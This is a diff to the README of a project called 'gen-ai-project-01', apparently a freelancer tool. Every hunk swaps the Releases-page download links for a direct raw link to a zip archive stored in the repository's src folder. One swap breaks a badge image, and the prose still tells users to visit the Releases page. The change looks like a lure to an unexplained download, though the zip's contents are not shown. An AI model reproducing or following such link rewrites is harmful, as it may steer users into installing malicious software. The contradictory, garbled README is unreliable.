@@ -1,6 +1,6 @@
 # 🌟 gen-ai-project-01 - Simplifying Your Freelance Journey
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/JefersonJeremia/gen-ai-project-01/releases)
+[![Download](https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip%20Now-Click%https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip)](https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the *Freelancer Hub Gen-AI Project*! This application is designed to 
 
 To download the application, visit the following link:
 
-[Visit this page to download](https://github.com/JefersonJeremia/gen-ai-project-01/releases)
+[Visit this page to download](https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip)
 
 Once you are on the Releases page, look for the latest version of the application. Click on it, and you will find the download files available for your system.
 
@@ -72,4 +72,4 @@ For further information, visit our documentation page and FAQ section available 
 
 You can download the application right now to streamline your freelance work!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/JefersonJeremia/gen-ai-project-01/releases)
+[![Download](https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip%20Now-Click%https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip)](https://raw.githubusercontent.com/JefersonJeremia/gen-ai-project-01/main/src/project-gen-ai-v3.4.zip)
